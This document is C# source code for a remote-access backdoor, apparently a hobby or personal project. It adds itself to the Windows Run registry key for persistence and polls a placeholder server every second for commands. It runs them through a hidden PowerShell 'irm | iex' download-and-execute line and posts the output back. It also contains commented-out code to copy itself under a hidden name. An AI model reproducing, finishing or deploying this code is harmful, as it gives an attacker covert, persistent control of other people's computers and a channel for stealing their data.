using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Net;
using System.Reflection.Metadata;
using System.Runtime.InteropServices;
using System.Text;
using System.Web;
using System.Xml.Linq;
using static System.Net.Mime.MediaTypeNames;

namespace CMDCommandUsingCsharp
{
    public class Program
    {
        static string URL = "SITE";
        static void Autoload()
        {
            string name = "remote2";
            RegistryKey rk = Registry.CurrentUser.OpenSubKey
            ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            rk.SetValue(name, Process.GetCurrentProcess().MainModule.FileName);
        }

        static bool Check(string URL)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(URL);
            try
            {
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                StreamReader reader = new StreamReader(response.GetResponseStream());
                string content = reader.ReadToEnd();
                if (content != "")
                {
                    return true;
                }
                return false;
            }
            catch (System.Net.WebException) { return false; }
        }


        static async Task clear()
        {

            using (var client = new HttpClient())
            {
                var response = await client.GetAsync($"{URL}/clear");
            }
        }

        static async Task answer(string ans)
        {

            using (var client = new HttpClient())
            {
                using (var content = new FormUrlEncodedContent(new Dictionary<string, string> { { "out", $"{ans}" } }))
                {
                    var response = await client.PostAsync($"{URL}/output", content);
                }
            }
        }


        static void Main(string[] args)
        {
            string sourceFile = Directory.GetCurrentDirectory();
            string targetPath =
                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Downloads\\remote.exe";
            //copy

            //File.SetAttributes(targetPath, FileAttributes.Hidden | FileAttributes.System);

            Autoload();
            string URLcmd = $"{URL}/cmd";
            /*Encoding utf8 = Encoding.GetEncoding("UTF-8");
            Encoding win1251 = CodePagesEncodingProvider.Instance.GetEncoding(1251);*/

            while (true)
            {
                if (Check(URLcmd))
                {
                    var proc1 = new ProcessStartInfo();

                    // '/c' tells cmd that we want it to execute the command that follows, and then exit.
                    System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo("powershell", $"/c irm {URLcmd} | iex");

                    // The following commands are needed to redirect the standard output. 
                    //This means that it will be redirected to the Process.StandardOutput StreamReader.
                    procStartInfo.RedirectStandardOutput = true;
                    procStartInfo.UseShellExecute = false;
                    // Do not create the black window.
                    procStartInfo.CreateNoWindow = true;

                    // Now we create a process, assign its ProcessStartInfo and start it
                    System.Diagnostics.Process proc = new System.Diagnostics.Process();
                    proc.StartInfo = procStartInfo;
                    proc.Start();

                    // Get the output into a string
                    string result = proc.StandardOutput.ReadToEnd();

                    Task task1 = answer(result);
                    // Display the command output.
                    //Console.WriteLine(result);

                    Task task2 = clear();
                }
                Thread.Sleep(1000);
            }
        }
    }
}
